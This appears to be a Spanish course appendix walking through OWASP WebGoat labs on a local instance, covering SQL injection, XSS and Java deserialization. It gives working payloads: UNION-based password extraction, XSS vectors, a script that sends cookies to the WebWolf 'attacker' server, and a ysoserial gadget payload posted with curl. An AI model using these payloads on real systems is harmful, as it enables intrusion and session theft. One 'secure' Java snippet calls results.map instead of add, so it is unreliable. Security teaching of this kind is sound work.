@@ -1,0 +1,1816 @@
+---
+title: "Apéndice: OWASP WebGoat — Laboratorio de Explotación Web"
+module: "anexo-webgoat"
+type: "anexo"
+description: "Laboratorio práctico de 7 vulnerabilidades web con OWASP WebGoat — SQLi, XSS, Deserialization, SSRF, JWT, Path Traversal, XXE"
+---
+
+# Apéndice: OWASP WebGoat — Laboratorio de Explotación Web
+
+## Introducción
+
+Este apéndice es un **laboratorio hands-on de explotación de vulnerabilidades web** usando [OWASP WebGoat](https://owasp.org/www-project-webgoat/), el proyecto insignia de OWASP para entrenamiento en seguridad de aplicaciones web. WebGoat es una aplicación Java/Spring Boot deliberadamente insegura con lecciones interactivas.
+
+### ¿Qué es OWASP WebGoat?
+
+WebGoat es una aplicación web en Java/Spring Boot que contiene **intencionalmente** vulnerabilidades de seguridad reales organizadas como **lecciones interactivas**. Cada lección enseña una vulnerabilidad específica con ejercicios prácticos que el estudiante debe completar.
+
+<div class="compact-diagram" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:16px 20px;margin:16px 0;">
+<svg viewBox="0 0 460 200" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:460px;">
+<text x="230" y="14" text-anchor="middle" fill="#1e293b" font-size="11" font-weight="bold">Arquitectura de OWASP WebGoat</text>
+<!-- Frontend -->
+<rect x="10" y="24" width="440" height="40" rx="6" fill="#3b82f6"/><text x="230" y="40" text-anchor="middle" fill="white" font-size="10" font-weight="bold">FRONTEND — Thymeleaf + HTML/JS</text>
+<rect x="20" y="48" width="130" height="14" rx="3" fill="#2563eb"/><text x="85" y="59" text-anchor="middle" fill="white" font-size="7">Lesson Pages</text>
+<rect x="165" y="48" width="130" height="14" rx="3" fill="#2563eb"/><text x="230" y="59" text-anchor="middle" fill="white" font-size="7">Exercise Forms</text>
+<rect x="310" y="48" width="130" height="14" rx="3" fill="#2563eb"/><text x="375" y="59" text-anchor="middle" fill="white" font-size="7">Progress Tracker</text>
+<!-- Arrow -->
+<line x1="230" y1="64" x2="230" y2="78" stroke="#94a3b8" stroke-width="2"/>
+<text x="240" y="76" fill="#64748b" font-size="8">HTTP REST API</text>
+<!-- Backend -->
+<rect x="10" y="82" width="440" height="50" rx="6" fill="#8b5cf6"/><text x="230" y="98" text-anchor="middle" fill="white" font-size="10" font-weight="bold">BACKEND — Spring Boot (Java 17+)</text>
+<rect x="20" y="106" width="100" height="20" rx="4" fill="#7c3aed"/><text x="70" y="120" text-anchor="middle" fill="white" font-size="7">Lesson Engine</text>
+<rect x="130" y="106" width="100" height="20" rx="4" fill="#7c3aed"/><text x="180" y="120" text-anchor="middle" fill="white" font-size="7">Auth Controller</text>
+<rect x="240" y="106" width="100" height="20" rx="4" fill="#7c3aed"/><text x="290" y="120" text-anchor="middle" fill="white" font-size="7">Vuln Endpoints</text>
+<rect x="350" y="106" width="90" height="20" rx="4" fill="#7c3aed"/><text x="395" y="120" text-anchor="middle" fill="white" font-size="7">Hint System</text>
+<!-- Arrow -->
+<line x1="230" y1="132" x2="230" y2="148" stroke="#94a3b8" stroke-width="2"/>
+<text x="240" y="145" fill="#64748b" font-size="8">JDBC / JPA</text>
+<!-- Database -->
+<rect x="10" y="152" width="440" height="30" rx="6" fill="#10b981"/><text x="230" y="172" text-anchor="middle" fill="white" font-size="9" font-weight="bold">DATABASE — H2 (users, lessons, challenges, salaries)</text>
+</svg>
+</div>
+
+### Características Únicas de WebGoat
+
+| Característica | Descripción |
+|----------------|-------------|
+| **Lecciones interactivas** | Cada vulnerabilidad es una lección con ejercicios paso a paso |
+| **Hints integrados** | Sistema de pistas para ayudar cuando estás atascado |
+| **Verificación automática** | WebGoat verifica si resolviste el ejercicio correctamente |
+| **Múltiples soluciones** | Muchas lecciones aceptan diferentes enfoques de explotación |
+| **WebWolf companion** | Servidor complementario para ataques que requieren infraestructura del atacante |
+
+### Objetivos de Aprendizaje
+
+Al completar este laboratorio podrás:
+
+- Identificar 7 categorías de vulnerabilidades web en una aplicación Java/Spring Boot
+- Explotar cada vulnerabilidad entendiendo el mecanismo subyacente
+- Comprender vulnerabilidades específicas de Java (deserialization, XXE, JWT)
+- Aplicar metodologías de descubrimiento sistemático
+- Implementar remediaciones técnicas específicas
+- Mapear cada vulnerabilidad a OWASP Top 10, CWE y MITRE ATT&CK
+
+### Duración
+
+- **Tiempo estimado**: 8-10 horas
+- **Tipo**: Individual
+- **Dificultad**: Progresiva (fácil → difícil)
+- **IMPORTANTE**: DEBES teclear todos los comandos manualmente. NO copy-paste.
+
+---
+
+## Requisitos y Despliegue
+
+### Herramientas Necesarias
+
+| Herramienta | Propósito | Instalación |
+|-------------|-----------|-------------|
+| **Docker** | Ejecutar WebGoat + WebWolf | `docker.com` |
+| **Burp Suite Community** | Interceptación HTTP | `portswigger.net/burp` |
+| **Firefox/Chrome** | Navegador con DevTools | Built-in |
+| **curl** | Peticiones HTTP manuales | Pre-instalado |
+| **Python 3** | Scripts de apoyo | Pre-instalado |
+| **ysoserial** (opcional) | Deserialization payloads | GitHub: frohoff/ysoserial |
+| **jwt_tool** (opcional) | JWT attacks | `pip3 install jwt_tool` |
+
+### Despliegue con Docker
+
+```bash
+# 1. Pull de la imagen oficial
+docker pull webgoat/webgoat
+
+# 2. Ejecutar WebGoat en puerto 8080 y WebWolf en 9090
+docker run --name webgoat -d \
+  -p 8080:8080 -p 9090:9090 \
+  webgoat/webgoat
+
+# 3. Verificar que está corriendo
+docker ps | grep webgoat
+
+# 4. Abrir en navegador
+# WebGoat: http://localhost:8080/WebGoat
+# WebWolf: http://localhost:9090/WebWolf
+```
+
+<div class="mermaid-diagram" style="background: #1e293b; border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid #334155;">
+<div style="color: #94a3b8; font-size: 0.85em; margin-bottom: 10px; font-family: monospace;">Figura 1: Arquitectura de OWASP WebGoat</div>
+<svg viewBox="0 0 600 280" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:600px;">
+<text x="300" y="20" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="bold">Arquitectura WebGoat — Spring Boot + H2</text>
+<rect x="10" y="35" width="580" height="60" rx="8" fill="#3b82f6" opacity="0.2" stroke="#3b82f6" stroke-width="2"/>
+<text x="300" y="55" text-anchor="middle" fill="#93c5fd" font-size="13" font-weight="bold">Frontend — Thymeleaf + HTML/JS</text>
+<rect x="30" y="65" width="100" height="22" rx="4" fill="#3b82f6"/><text x="80" y="80" text-anchor="middle" fill="white" font-size="10">Login Page</text>
+<rect x="145" y="65" width="100" height="22" rx="4" fill="#3b82f6"/><text x="195" y="80" text-anchor="middle" fill="white" font-size="10">SQL Injection</text>
+<rect x="260" y="65" width="100" height="22" rx="4" fill="#3b82f6"/><text x="310" y="80" text-anchor="middle" fill="white" font-size="10">XSS Lessons</text>
+<rect x="375" y="65" width="100" height="22" rx="4" fill="#3b82f6"/><text x="425" y="80" text-anchor="middle" fill="white" font-size="10">JWT Tokens</text>
+<rect x="490" y="65" width="90" height="22" rx="4" fill="#3b82f6"/><text x="535" y="80" text-anchor="middle" fill="white" font-size="10">SSRF</text>
+<rect x="10" y="110" width="580" height="60" rx="8" fill="#8b5cf6" opacity="0.2" stroke="#8b5cf6" stroke-width="2"/>
+<text x="300" y="130" text-anchor="middle" fill="#c4b5fd" font-size="13" font-weight="bold">Backend — Spring Boot (Java 17+)</text>
+<rect x="30" y="140" width="100" height="22" rx="4" fill="#7c3aed"/><text x="80" y="155" text-anchor="middle" fill="white" font-size="10">Lesson Engine</text>
+<rect x="145" y="140" width="100" height="22" rx="4" fill="#7c3aed"/><text x="195" y="155" text-anchor="middle" fill="white" font-size="10">Auth Filters</text>
+<rect x="260" y="140" width="100" height="22" rx="4" fill="#7c3aed"/><text x="310" y="155" text-anchor="middle" fill="white" font-size="10">Vuln Controllers</text>
+<rect x="375" y="140" width="100" height="22" rx="4" fill="#7c3aed"/><text x="425" y="155" text-anchor="middle" fill="white" font-size="10">Hint System</text>
+<rect x="490" y="140" width="90" height="22" rx="4" fill="#7c3aed"/><text x="535" y="155" text-anchor="middle" fill="white" font-size="10">WebWolf API</text>
+<rect x="100" y="185" width="400" height="60" rx="8" fill="#10b981" opacity="0.2" stroke="#10b981" stroke-width="2"/>
+<text x="300" y="205" text-anchor="middle" fill="#6ee7b7" font-size="13" font-weight="bold">Database — H2 (In-Memory)</text>
+<ellipse cx="180" cy="230" rx="55" ry="15" fill="#10b981"/><text x="180" y="234" text-anchor="middle" fill="white" font-size="10">users</text>
+<ellipse cx="300" cy="230" rx="55" ry="15" fill="#10b981"/><text x="300" y="234" text-anchor="middle" fill="white" font-size="10">salaries</text>
+<ellipse cx="420" cy="230" rx="55" ry="15" fill="#10b981"/><text x="420" y="234" text-anchor="middle" fill="white" font-size="10">challenges</text>
+<line x1="300" y1="95" x2="300" y2="110" stroke="#64748b" stroke-width="2"/><polygon points="300,110 295,100 305,100" fill="#64748b"/>
+<text x="310" y="106" fill="#94a3b8" font-size="10">HTTP REST</text>
+<line x1="300" y1="170" x2="300" y2="185" stroke="#64748b" stroke-width="2"/><polygon points="300,185 295,175 305,175" fill="#64748b"/>
+<text x="310" y="181" fill="#94a3b8" font-size="10">JDBC/JPA</text>
+</svg>
+</div>
+
+### Verificación del Entorno
+
+```bash
+# Verificar que WebGoat responde
+curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/WebGoat
+
+# Debería devolver 200 o 302
+
+# Verificar WebWolf
+curl -s -o /dev/null -w "%{http_code}" http://localhost:9090/WebWolf
+
+# Ambos deben estar activos para las lecciones completas
+```
+
+### Registro y Acceso
+
+WebGoat no tiene credenciales por defecto — **cada usuario crea su propia cuenta** al acceder por primera vez:
+
+1. Ir a `http://localhost:8080/WebGoat`
+2. Crear un username y password
+3. Cada usuario tiene su propia sesión y progreso independiente
+
+### WebWolf — Servidor Complementario
+
+WebWolf es un servidor complementario que simula la infraestructura del atacante:
+
+```
+WebGoat (8080): Aplicación vulnerable
+WebWolf (9090): "Servidor del atacante" para recibir callbacks, emails, archivos
+```
+
+WebWolf se usa en lecciones de SSRF, JWT, y ataques que requieren un servidor externo controlado por el atacante.
+
+---
+
+## Marco Ético y Legal
+
+::: {.callout-important}
+## OBLIGATORIO: LEER ANTES DE PROCEDER
+
+Este laboratorio es **exclusivamente educativo**. Las técnicas que aprenderás aquí tienen aplicaciones legítimas y ilegales. La diferencia es el **permiso**.
+:::
+
+### Reglas de Engagement (ROE)
+
+| Regla | Descripción | Consecuencia de Violación |
+|-------|-------------|--------------------------|
+| **SOLO localhost** | Explota SOLO tu instancia local | Acceso ilegal a sistemas |
+| **NO otros targets** | No uses estas técnicas en sitios web reales sin autorización | Cargos criminales |
+| **NO exfiltración** | No extraigas datos reales de terceros | Violación de privacidad |
+| **Documenta todo** | Registra cada paso en tu laboratorio | Sin evidencia = sin defensa |
+| **Reporta responsablemente** | Si encuentras vulns reales, sigue responsible disclosure | Legal protection |
+
+### Marco Legal Aplicable
+
+| Jurisdicción | Ley | Artículo | Pena |
+|--------------|-----|----------|------|
+| **Ecuador** | Código Penal | Art. 202-203 | 1-3 años prisión |
+| **Ecuador** | LOGIDP | Art. 55-56 | Multas hasta $500K |
+| **Internacional** | Convenio de Budapest | Art. 2-6 | Variable por país |
+| **EE.UU.** | CFAA (18 USC §1030) | §1030(a)(2) | Hasta 10 años |
+
+### Principio Fundamental
+
+> **Sin permiso escrito = ilegal. Punto.**
+>
+> No importa si tu intención es "ayudar". No importa si "solo mirabas". No importa si "no hiciste daño". El acceso no autorizado es delito en la mayoría de jurisdicciones.
+
+---
+
+## 1. SQL Injection — Lesson: SQL Injection
+
+### 🎯 Qué es
+
+SQL Injection en WebGoat aparece en múltiples lecciones del módulo "SQL Injection". Cada lección presenta un escenario diferente: login bypass, data extraction, blind SQLi, y más. La aplicación usa JDBC para construir queries concatenando input del usuario.
+
+**OWASP Top 10**: A03:2021 — Injection
+**CWE**: CWE-89 — SQL Injection
+**MITRE ATT&CK**: T1190 — Exploit Public-Facing Application
+
+### 🔧 Cómo funciona
+
+```java
+// WebGoat — código vulnerable (simplificado)
+// SQLInjection.java
+String query = "SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";
+ResultSet results = statement.executeQuery(query);
+```
+
+```sql
+-- Query normal (input: Smith):
+SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith'
+
+-- Query inyectada (input: Smith' OR '1'='1):
+SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith' OR '1'='1'
+-- Devuelve TODOS los registros porque '1'='1' siempre es TRUE
+```
+
+### ⏰ Cuándo ocurre
+
+- Cuando la aplicación concatena input del usuario en queries SQL
+- Cuando NO usa PreparedStatement con parámetros
+- Cuando NO valida el tipo de dato esperado
+- En Java: cuando se usa `Statement` en lugar de `PreparedStatement`
+
+### 📍 Dónde se encuentra
+
+En WebGoat: **SQL Injection lessons** (`/WebGoat/SqlInjection`)
+
+Las lecciones incluyen:
+- **Stage 1**: SQL Injection (intro) — Login bypass
+- **Stage 2**: SQL Injection (advanced) — UNION-based data extraction
+- **Stage 3**: Blind SQLi — Boolean-based inference
+- **Stage 4**: SQL Injection (mitigation) — Cómo prevenir
+
+### ❓ Por qué existe
+
+**Causa raíz**: String concatenation en queries SQL:
+
+```java
+// ❌ VULNERABLE — String concatenation
+String query = "SELECT * FROM user_data WHERE last_name = '" + lastName + "'";
+Statement statement = connection.createStatement();
+ResultSet results = statement.executeQuery(query);
+
+// ✅ SEGURO — PreparedStatement con parámetros
+String query = "SELECT * FROM user_data WHERE last_name = ?";
+PreparedStatement statement = connection.prepareStatement(query);
+statement.setString(1, lastName);
+ResultSet results = statement.executeQuery();
+```
+
+### 🚀 Para qué se explota
+
+**Impacto del atacante**:
+
+| Objetivo | Resultado |
+|----------|-----------|
+| Extracción de datos | Leer tablas completas (usuarios, salaries, credit cards) |
+| Bypass de autenticación | Acceder como cualquier usuario |
+| Modificación de datos | UPDATE/DELETE de registros |
+| Database enumeration | Descubrir tablas, columnas, estructura |
+
+### 🔍 Cómo buscarla
+
+**Metodología**:
+
+```
+PASO 1: Identificar puntos de entrada
+  ├── Formularios de búsqueda, login, filtros
+  ├── Parámetros URL (?name=, ?id=)
+  └── API endpoints (POST body, JSON fields)
+
+PASO 2: Probar caracteres SQL
+  ├── ' → ¿Error 500 o mensaje de error SQL?
+  ├── ' OR '1'='1 → ¿Resultado inesperado?
+  └── ' UNION SELECT NULL-- → ¿Múltiples columnas?
+
+PASO 3: Determinar número de columnas
+  ├── ORDER BY 1, ORDER BY 2...
+  └── UNION SELECT NULL, NULL, NULL...
+```
+
+### 💥 Cómo explotarla
+
+**Fundamento técnico**: WebGoat usa JDBC con string concatenation en varias lecciones. El input del usuario se inserta directamente en la query SQL sin sanitización.
+
+**Explotación paso a paso**:
+
+```bash
+# Paso 1: Login en WebGoat
+# Ir a http://localhost:8080/WebGoat y crear cuenta
+
+# Paso 2: Ir a la lección SQL Injection
+# Menú lateral → SQL Injection → Stage 1
+
+# Paso 3: Probar inyección básica en el formulario
+# En el campo "Last Name", ingresar:
+Smith' OR '1'='1
+
+# Paso 4: Si funciona, verás TODOS los registros de user_data
+# Esto confirma que la query es vulnerable
+
+# Paso 5: UNION-based extraction (Stage 2)
+# En el campo de búsqueda, ingresar:
+Smith' UNION SELECT userid,user_name, password,cookie,cookie,cookie,cookie FROM user_system_data --
+
+# Paso 6: Extraer información de la base de datos
+# Para determinar número de columnas:
+Smith' ORDER BY 1--
+Smith' ORDER BY 2--
+Smith' ORDER BY 3--
+# ... hasta que dé error
+
+# Paso 7: Extraer nombres de tablas (H2 database)
+Smith' UNION SELECT NULL, TABLE_NAME, NULL, NULL, NULL, NULL, NULL FROM INFORMATION_SCHEMA.TABLES --
+```
+
+**Con curl (para lecciones basadas en API)**:
+
+```bash
+# Paso 1: Obtener JSESSIONID después de login
+# (Usar el browser para login, luego copiar la cookie)
+
+# Paso 2: Enviar SQLi via POST
+curl -X POST http://localhost:8080/WebGoat/SqlInjection/assignment5a \
+  -H "Cookie: JSESSIONID=<TU_SESSION_ID>" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "account=Smith%27+OR+%271%27%3D%271&operator=&action=Go"
+
+# URL-decoded: account=Smith' OR '1'='1
+```
+
+<div class="mermaid-diagram" style="background: #1e293b; border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid #334155;">
+<div style="color: #94a3b8; font-size: 0.85em; margin-bottom: 10px; font-family: monospace;">Figura 2: SQLi en WebGoat — JDBC Query Construction</div>
+<svg viewBox="0 0 600 240" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:600px;">
+<text x="300" y="20" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="bold">SQLi — WebGoat JDBC Query Flow</text>
+<rect x="20" y="35" width="140" height="35" rx="6" fill="#ef4444"/><text x="90" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">User Input</text><text x="90" y="63" text-anchor="middle" fill="#fca5a5" font-size="9">Smith' OR '1'='1</text>
+<polygon points="160,52 190,52 185,47 190,57" fill="#94a3b8"/>
+<rect x="190" y="35" width="180" height="35" rx="6" fill="#8b5cf6"/><text x="280" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">Spring Controller</text><text x="280" y="63" text-anchor="middle" fill="#c4b5fd" font-size="9">String query = "SELECT..."+ input</text>
+<polygon points="370,52 400,52 395,47 400,57" fill="#94a3b8"/>
+<rect x="400" y="35" width="180" height="35" rx="6" fill="#f59e0b"/><text x="490" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">JDBC Statement</text><text x="490" y="63" text-anchor="middle" fill="#fef3c7" font-size="9">executeQuery(vulnerable_sql)</text>
+<line x1="490" y1="70" x2="490" y2="90" stroke="#94a3b8" stroke-width="2"/>
+<rect x="400" y="95" width="180" height="35" rx="6" fill="#10b981"/><text x="490" y="110" text-anchor="middle" fill="white" font-size="11" font-weight="bold">H2 Database</text><text x="490" y="123" text-anchor="middle" fill="#d1fae5" font-size="9">Returns ALL user records</text>
+<rect x="20" y="145" width="560" height="45" rx="8" fill="#7f1d1d" stroke="#ef4444"/>
+<text x="300" y="165" text-anchor="middle" fill="#fca5a5" font-size="12" font-weight="bold">Vulnerable: String concatenation in SQL query</text>
+<text x="300" y="182" text-anchor="middle" fill="#e2e8f0" font-size="10">Fix: Use PreparedStatement with parameterized queries</text>
+<rect x="20" y="200" width="560" height="30" rx="6" fill="#1e293b" stroke="#334155"/>
+<text x="300" y="220" text-anchor="middle" fill="#94a3b8" font-size="10">WebGoat SQL Injection lessons: Stage 1 (basic) → Stage 4 (mitigation)</text>
+</svg>
+</div>
+
+### 🛡️ Cómo mitigarla
+
+**Remediación técnica específica**:
+
+```java
+// ✅ SEGURO — PreparedStatement con parámetros
+public List<UserData> getUserData(String lastName) throws SQLException {
+    String query = "SELECT * FROM user_data WHERE last_name = ?";
+
+    try (PreparedStatement stmt = connection.prepareStatement(query)) {
+        stmt.setString(1, lastName);
+
+        try (ResultSet rs = stmt.executeQuery()) {
+            List<UserData> results = new ArrayList<>();
+            while (rs.next()) {
+                results.map(extractUserData(rs));
+            }
+            return results;
+        }
+    }
+}
+
+// ✅ MEJOR — Usar JPA/Hibernate con named parameters
+@Query("SELECT u FROM UserData u WHERE u.lastName = :lastName")
+List<UserData> findByLastName(@Param("lastName") String lastName);
+```
+
+**Capas de defensa**:
+
+| Capa | Técnica | Efectividad |
+|------|---------|-------------|
+| **Primaria** | PreparedStatement con parámetros | ~100% |
+| **Secundaria** | Input validation (type checking) | Alta |
+| **Terciaria** | ORM con query builder seguro | Alta |
+| **Monitoreo** | WAF con reglas SQLi | Media |
+| **DB** | Least privilege DB user | Reduce impacto |
+
+---
+
+## 2. XSS — Lesson: Cross-Site Scripting
+
+### 🎯 Qué es
+
+Cross-Site Scripting en WebGoat aparece en múltiples lecciones del módulo "Cross-Site Scripting". Incluye variantes reflected, stored, y DOM-based XSS. WebGoat demuestra cómo el input no sanitizado se refleja en el HTML o se almacena en la base de datos.
+
+**OWASP Top 10**: A07:2021 — Cross-Site Scripting
+**CWE**: CWE-79 — Improper Neutralization of Input During Web Page Generation
+**MITRE ATT&CK**: T1059.007 — JavaScript
+
+### 🔧 Cómo funciona
+
+```java
+// WebGoat — código vulnerable (simplificado)
+// CrossSiteScripting.java
+@GetMapping
+public String search(@RequestParam String query) {
+    return "search_results.html";
+    // El template engine renderiza 'query' sin encoding
+}
+```
+
+En Thymeleaf (motor de templates de Spring Boot):
+
+```html
+<!-- ❌ VULNERABLE — th:utext renderiza HTML sin escapar -->
+<div th:utext="${query}"></div>
+
+<!-- ✅ SEGURO — th:text escapa automáticamente -->
+<div th:text="${query}"></div>
+```
+
+### ⏰ Cuándo ocurre
+
+- Cuando el template engine renderiza input sin encoding (`th:utext` en Thymeleaf)
+- Cuando se usa `innerHTML` en JavaScript con datos no confiables
+- Cuando se almacena input sin sanitizar y se muestra después
+- En Spring Boot: cuando se desactiva el auto-escaping del template engine
+
+### 📍 Dónde se encuentra
+
+En WebGoat: **XSS lessons** (`/WebGoat/CrossSiteScripting`)
+
+Las lecciones incluyen:
+- **XSS Lesson 1**: Reflected XSS — Search box
+- **XSS Lesson 2**: Stored XSS — Message board
+- **XSS Lesson 3**: DOM XSS — Client-side rendering
+- **XSS Lesson 4**: XSS mitigation — CSP, encoding
+
+### ❓ Por qué existe
+
+**Causa raíz**: Template rendering sin encoding:
+
+```java
+// ❌ VULNERABLE — th:utext sin sanitización
+// En el template HTML:
+<div th:utext="${searchQuery}"></div>
+// Si searchQuery = <script>alert(1)</script> → se ejecuta
+
+// ✅ SEGURO — th:text con auto-escaping
+<div th:text="${searchQuery}"></div>
+// Resultado: &lt;script&gt;alert(1)&lt;/script&gt; (texto, no código)
+```
+
+### 🚀 Para qué se explota
+
+**Impacto del atacante**:
+
+| Ataque | Descripción | Impacto |
+|--------|-------------|---------|
+| **Cookie stealing** | `document.cookie` → enviar al atacante | Robo de sesión |
+| **Keylogging** | Capturar tecleo del usuario | Credenciales |
+| **Phishing** | Inyectar formularios falsos | Suplantación |
+| **Redirection** | Redirigir a sitio malicioso | Malware |
+
+### 🔍 Cómo buscarla
+
+**Metodología**:
+
+```
+PASO 1: Identificar puntos de reflection
+  ├── Búsquedas, formularios, perfiles
+  ├── Mensajes de error personalizados
+  └── Cualquier input que se refleje en la respuesta
+
+PASO 2: Probar payloads
+  ├── <script>alert(1)</script>
+  ├── <img src=x onerror=alert(1)>
+  └── <svg onload=alert(1)>
+
+PASO 3: Verificar ejecución
+  ├── ¿Aparece el alert? → Vulnerable
+  └── ¿Se muestra como texto? → Seguro
+```
+
+### 💥 Cómo explotarla
+
+**Explotación paso a paso**:
+
+```bash
+# Paso 1: Ir a la lección XSS en WebGoat
+# Menú lateral → Cross-Site Scripting → XSS Lesson 1
+
+# Paso 2: Probar reflected XSS en el search box
+# En el campo de búsqueda, ingresar:
+<script>alert('XSS')</script>
+
+# Paso 3: Si el <script> tag está filtrado, probar alternativas
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+# Paso 4: Para stored XSS (Lesson 2)
+# En el message board, ingresar:
+<script>fetch('http://localhost:9090/WebWolf/landing?c='+document.cookie)</script>
+
+# Esto envía las cookies a WebWolf (el "servidor del atacante")
+
+# Paso 5: Verificar en WebWolf
+# Ir a http://localhost:9090/WebWolf/requests
+# Deberías ver la petición con las cookies
+```
+
+**Con curl**:
+
+```bash
+# Paso 1: Login y obtener cookie
+# (Usar browser para login, copiar JSESSIONID)
+
+# Paso 2: Enviar XSS via search endpoint
+curl -X POST http://localhost:8080/WebGoat/CrossSiteScripting/attack1 \
+  -H "Cookie: JSESSIONID=<TU_SESSION_ID>" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "QTY1=1&QTY2=1&QTY3=1&field1=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&field2=1"
+```
+
+### 🛡️ Cómo mitigarla
+
+**Remediación técnica específica**:
+
+```java
+// ✅ SEGURO — Thymeleaf con auto-escaping (default)
+// En el template:
+<div th:text="${searchQuery}"></div>
+// th:text escapa automáticamente: < → &lt;, > → &gt;
+
+// ✅ SEGURO — Si necesitas HTML, sanitizar explícitamente
+import org.owasp.html.Sanitizers;
+String clean = Sanitizers.FORMATTING.sanitize(userInput);
+
+// ✅ SEGURO — Content Security Policy
+@Configuration
+public class SecurityConfig {
+    @Bean
+    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+        http.headers(headers -> headers
+            .contentSecurityPolicy(csp -> csp
+                .policyDirectives("default-src 'self'; script-src 'self'")
+            )
+        );
+        return http.build();
+    }
+}
+```
+
+**Capas de defensa**:
+
+| Capa | Técnica | Efectividad |
+|------|---------|-------------|
+| **Primaria** | Output encoding (th:text, no th:utext) | ~100% |
+| **Secundaria** | Content Security Policy (CSP) | Alta |
+| **Terciaria** | Input validation del lado del servidor | Media |
+| **Framework** | Auto-escaping del template engine | Alta |
+
+---
+
+## 3. Insecure Deserialization — Lesson: Insecure Deserialization
+
+### 🎯 Qué es
+
+Insecure Deserialization ocurre cuando una aplicación deserializa datos no confiables sin validación, permitiendo que un atacante inyecte objetos maliciosos que ejecutan código durante la deserialización. En Java, esto es particularmente peligroso porque la deserialización puede invocar constructores y métodos arbitrarios.
+
+**OWASP Top 10**: A08:2021 — Software and Data Integrity Failures
+**CWE**: CWE-502 — Deserialization of Untrusted Data
+**MITRE ATT&CK**: T1190 — Exploit Public-Facing Application
+
+### 🔧 Cómo funciona
+
+```java
+// WebGoat — código vulnerable (simplificado)
+// InsecureDeserialization.java
+ObjectInputStream ois = new ObjectInputStream(inputStream);
+Object obj = ois.readObject(); // ← Deserializa sin validar
+// Si obj es un gadget chain malicioso → RCE
+```
+
+El ataque funciona mediante **gadget chains** — secuencias de clases legítimas que, cuando se deserializan en un orden específico, ejecutan código arbitrario:
+
+```
+Attacker crafts serialized object
+  → Contains gadget chain (commons-collections, etc.)
+    → Server deserializes
+      → Gadget chain executes
+        → Arbitrary code runs (RCE)
+```
+
+### ⏰ Cuándo ocurre
+
+- Cuando la aplicación deserializa datos de fuentes no confiables
+- Cuando usa `ObjectInputStream.readObject()` sin validación
+- Cuando hay librerías vulnerables en el classpath (commons-collections, etc.)
+- Cuando NO hay un `ObjectInputFilter` que restrinja qué clases se pueden deserializar
+
+### 📍 Dónde se encuentra
+
+En WebGoat: **Insecure Deserialization lesson** (`/WebGoat/InsecureDeserialization`)
+
+La lección presenta un formulario que acepta datos serializados y los deserializa.
+
+### ❓ Por qué existe
+
+**Causa raíz**: Deserialización sin validación de clases:
+
+```java
+// ❌ VULNERABLE — Deserialización sin filtro
+ObjectInputStream ois = new ObjectInputStream(inputStream);
+Object obj = ois.readObject(); // Acepta CUALQUIER clase
+
+// ✅ SEGURO — ObjectInputFilter (Java 9+)
+ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
+    "java.base/java.lang.String;" +
+    "java.base/java.util.*;" +
+    "!*" // Deny all other classes
+);
+ObjectInputStream ois = new ObjectInputStream(inputStream);
+ois.setObjectInputFilter(filter);
+Object obj = ois.readObject(); // Solo permite clases en la whitelist
+```
+
+### 🚀 Para qué se explota
+
+**Impacto del atacante**:
+
+| Objetivo | Resultado | Impacto |
+|----------|-----------|---------|
+| Remote Code Execution (RCE) | Ejecutar comandos OS en el servidor | **Crítico** |
+| Denial of Service | Consumir recursos del servidor | Alto |
+| Authentication bypass | Manipular objetos de sesión | Crítico |
+| Data manipulation | Modificar datos de la aplicación | Alto |
+
+### 🔍 Cómo buscarla
+
+**Metodología**:
+
+```
+PASO 1: Identificar endpoints que aceptan datos serializados
+  ├── Java serialization (aced 0005 header)
+  ├── XML deserialization
+  ├── JSON deserialization con tipos dinámicos
+  └── YAML deserialization
+
+PASO 2: Verificar librerías vulnerables
+  ├── commons-collections < 3.2.2
+  ├── commons-beanutils < 1.9.3
+  ├── spring-aop < 4.3.13
+  └── Usar dependency-check para escanear
+
+PASO 3: Generar payload con ysoserial
+  ├── java -jar ysoserial.jar CommonsCollections5 "cmd"
+  └── Enviar al endpoint vulnerable
+```
+
+### 💥 Cómo explotarla
+
+**Fundamento técnico**: Java serializa objetos a un formato binario que comienza con los bytes `aced 0005`. Cuando el servidor deserializa estos bytes, reconstruye los objetos y ejecuta sus métodos. Si el objeto serializado contiene un gadget chain, la deserialización ejecuta código arbitrario.
+
+**Explotación paso a paso**:
+
+```bash
+# Paso 1: Ir a la lección de Insecure Deserialization
+# Menú lateral → Insecure Deserialization
+
+# Paso 2: La lección generalmente pide que manipules
+# un objeto serializado para cambiar un valor
+
+# Paso 3: En WebGoat, la lección de deserialization
+# usualmente involucra modificar un token o objeto
+# para obtener acceso no autorizado
+
+# Paso 4: Usar ysoserial para generar payloads
+# (Solo en entorno controlado — educativo)
+
+# Instalar ysoserial
+git clone https://github.com/frohoff/ysoserial.git
+cd ysoserial && mvn package -DskipTests
+
+# Generar payload (ejemplo educativo)
+java -jar ysoserial/target/ysoserial-*.jar \
+  CommonsCollections5 "touch /tmp/pwned" > /tmp/payload.ser
+
+# Paso 5: Enviar el payload al endpoint
+curl -X POST http://localhost:8080/WebGoat/InsecureDeserialization/task \
+  -H "Cookie: JSESSIONID=<TU_SESSION_ID>" \
+  -H "Content-Type: application/octet-stream" \
+  --data-binary @/tmp/payload.ser
+```
+
+**En la lección de WebGoat** (generalmente más guiada):
+
+```
+1. WebGoat te da un objeto serializado en Base64
+2. Decodificar: base64 -d < token > token.ser
+3. Analizar con SerializationDumper o similar
+4. Modificar el valor deseado (ej: cambiar isAdmin=false a isAdmin=true)
